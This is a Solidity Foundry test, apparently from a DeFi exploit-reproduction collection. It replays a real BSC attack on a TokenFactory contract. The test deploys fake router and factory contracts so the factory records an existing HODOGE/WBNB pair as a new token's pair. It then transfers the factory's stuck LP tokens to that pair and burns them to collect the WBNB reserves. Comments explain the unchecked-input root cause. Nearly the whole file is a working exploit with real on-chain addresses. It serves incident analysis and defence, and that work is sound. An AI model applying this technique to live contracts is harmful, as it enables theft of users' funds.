// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 657.17 USD
// Attacker : 0xc49F2938327aa2cDc3F2f89Ed17b54B3671F05DE
// Attack Contract : 0xC427866DcFa3dEc145B97ba73D1073a186A59769
// Vulnerable Contract : 0xe4997f98E84C1891e7b57069e177fcCF5f4F6094
// Attack Tx : https://bscscan.com/tx/0xf74bf7f41c8ca380d439dd94eab95d1bbb1f6fc934e69f2e42eb3325def8514a
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xe4997f98E84C1891e7b57069e177fcCF5f4F6094#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1242
//
// Attack summary: The attacker supplied fake router/factory contracts to TokenFactory so a newly created token
// recorded an existing HODOGE/WBNB Pancake pair as its pair, moved TokenFactory's stuck LP tokens to the pair, and
// burned them for reserves.
// Root cause: TokenFactory trusted caller-supplied liquidity infrastructure and did not verify the returned pair
// belonged to the newly created token.

address constant ATTACKER = 0xc49F2938327aa2cDc3F2f89Ed17b54B3671F05DE;
address constant TOKEN_FACTORY = 0xe4997f98E84C1891e7b57069e177fcCF5f4F6094;
address constant HODOGE_WBNB_PAIR = 0xda4f7E39Ef7E4e243b7fC8C980B5E8D794D84F5d;
address constant HODOGE = 0x328b065F04De0314374B5974Af532401a6170BAC;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

interface ITokenFactory {
    struct TokenInfo {
        string name;
        string symbol;
        uint8 decimal;
        uint256 initialSupply;
        address pairAddress;
    }

    function fee() external view returns (uint256);

    function createTokenAndAddLiquidity(
        TokenInfo memory tokenInfo,
        uint256 ethAmount,
        address swapRouter,
        address swapFactory,
        address weth
    ) external payable returns (address tokenAddress, address pairAddress);

    function transferPair(address tokenAddress, address to) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 51_101_790;
        vm.createSelectFork("bsc", forkBlock);

        vm.label(ATTACKER, "Attacker");
        vm.label(TOKEN_FACTORY, "TokenFactory");
        vm.label(HODOGE_WBNB_PAIR, "HODOGE/WBNB Pair");
        vm.label(HODOGE, "HODOGE");
        vm.label(WBNB_TOKEN, "WBNB");
    }

    function testExploit() public {
        ITokenFactory factory = ITokenFactory(TOKEN_FACTORY);
        uint256 stuckLpBalance = IERC20(HODOGE_WBNB_PAIR).balanceOf(TOKEN_FACTORY);
        uint256 attackerWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(ATTACKER);

        assertGt(stuckLpBalance, 0);
        deal(ATTACKER, factory.fee());

        // step 1: attacker-controlled router/factory make TokenFactory record the existing victim pair.
        vm.startPrank(ATTACKER);
        FakeRouter fakeRouter = new FakeRouter();
        FakeFactory fakeFactory = new FakeFactory(HODOGE_WBNB_PAIR);
        ITokenFactory.TokenInfo memory tokenInfo = ITokenFactory.TokenInfo({
            name: "USDT",
            symbol: "USDT",
            decimal: 18,
            initialSupply: 1 ether,
            pairAddress: address(0)
        });

        (address fakeToken,) =
            factory.createTokenAndAddLiquidity{value: factory.fee()}(tokenInfo, 0, address(fakeRouter), address(fakeFactory), WBNB_TOKEN);

        // step 2: move TokenFactory's unrelated HODOGE/WBNB LP tokens to the pair and burn them.
        factory.transferPair(fakeToken, HODOGE_WBNB_PAIR);
        IUniswapV2Pair(HODOGE_WBNB_PAIR).burn(ATTACKER);
        vm.stopPrank();

        // step 3: the attacker receives WBNB reserves and TokenFactory loses the stuck LP balance.
        uint256 attackerWbnbProfit = IERC20(WBNB_TOKEN).balanceOf(ATTACKER) - attackerWbnbBefore;
        assertGt(attackerWbnbProfit, 0.9 ether);
        assertEq(IERC20(HODOGE_WBNB_PAIR).balanceOf(TOKEN_FACTORY), 0);
    }
}

contract FakeFactory {
    address private immutable pair;

    constructor(
        address pair_
    ) {
        pair = pair_;
    }

    function getPair(address, address) external view returns (address) {
        return pair;
    }
}

contract FakeRouter {
    function addLiquidityETH(
        address,
        uint256,
        uint256,
        uint256,
        address,
        uint256
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity) {
        return (0, 0, 0);
    }
}
